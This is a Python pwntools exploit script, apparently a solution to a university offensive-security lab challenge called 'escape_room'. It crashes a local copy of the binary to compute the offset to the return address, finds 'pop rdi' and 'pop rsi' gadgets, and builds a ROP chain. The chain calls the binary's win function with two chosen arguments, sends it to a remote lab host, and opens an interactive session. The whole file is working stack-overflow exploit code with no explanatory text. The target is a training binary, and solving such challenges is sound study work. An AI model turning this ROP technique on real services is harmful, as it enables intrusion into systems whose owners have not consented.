from pwn import *

elf = ELF('/home/kali/Desktop/offsec/labs/lab1/materiale/challenges/02-escape-room/escape_room')

ADDR = "offsec.m0lecon.it"
port = 13554

context.binary = elf
context.arch = "amd64"
context.os = "linux"

def conn():
    if args.LOCAL:
        r = process(elf.path)
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote(ADDR, port)

    return r

def get_ret_offset():
    # Start a dummy process to crash
    p_crash = process(elf.path)
    
    p_crash.recvuntil(b"keys?\n")
    p_crash.sendline(cyclic(200))
    p_crash.wait()
    
    # Grab the core dump generated by the crash
    core = p_crash.corefile

    crash_value = core.read(core.rsp, 4)
    
    offset = cyclic_find(crash_value)
    print(f"Calculated offset to RIP: {offset}")
    return offset

OFFSET_TO_RIP = get_ret_offset()

rop = ROP(elf)

pop_rdi_gadget = rop.find_gadget(['pop rdi', 'ret'])[0]
log.info(f"Found 'pop rdi; ret' gadget at: {hex(pop_rdi_gadget)}")

pop_rsi_gadget = rop.find_gadget(['pop rsi', 'ret'])[0]
log.info(f"Found 'pop rsi; ret' gadget at: {hex(pop_rsi_gadget)}")

ret_gadget = rop.find_gadget(['ret'])[0]
log.info(f"Found 'ret' gadget at: {hex(ret_gadget)}")

win_addr = elf.sym.win
log.info(f"Found 'win' function at: {hex(win_addr)}")

arg1_target = 0xdeadbeef
arg2_target = 0xcafebabe

payload = flat(
    b'A' * OFFSET_TO_RIP,
    p64(pop_rdi_gadget),
    p64(arg1_target),
    p64(pop_rsi_gadget),
    p64(arg2_target),
    p64(ret_gadget),    #for allignment
    p64(win_addr)
)

r = conn()
r.recvuntil(b"keys?\n")

r.sendline(payload)

r.interactive()